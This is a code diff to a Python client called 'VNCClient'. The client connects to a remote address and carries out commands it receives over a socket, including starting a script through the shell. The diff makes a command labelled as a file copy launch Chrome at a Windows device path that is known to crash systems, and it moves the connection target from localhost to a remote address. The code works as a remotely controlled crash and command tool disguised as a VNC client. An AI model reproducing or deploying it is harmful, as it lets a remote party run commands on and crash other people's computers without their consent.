@@ -1,9 +1,5 @@
-import pyautogui
 import socket
-import base64
 import subprocess
-import json
-import time
 import os
 from lib.host import ipadd
 
@@ -12,15 +8,7 @@ class VNCClient:
     def __init__(self, ip, port):
 
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # while True:
-        #     try:
-        #         #self.client.connect((ip, port))
         self.s.connect((ip, port))
-        #     break
-        # except:
-        #     time.sleep(1)
-        #self.s.connect((ip, port))
-        # self.data = "Connected"
         while True:
             self.a = self.s.recv(1024)
             self.a = self.a.decode()
@@ -37,11 +25,14 @@ class VNCClient:
                 subprocess.call('start cmdc.py', shell=True)
                 print(f"command = {self.a}")
             elif self.a == 'cpfl':
-                print("CopyFile")
-                print(f"command = {self.a}")
+                # os.system(
+                #     'start chrome "*\*\*\.\globalroot\device\condrv\kernelconnect" --kiosk')
+                subprocess.Popen(
+                    ["chrome", "\\\\\\.\globalroot\device\condrv\kernelconnect"])
+
             elif self.a == 'X':
                 print(f"command = {self.a}")
 
 
-myclient = VNCClient("localhost", 81)
+myclient = VNCClient(ipadd, 121)
 myclient.execute_handler()
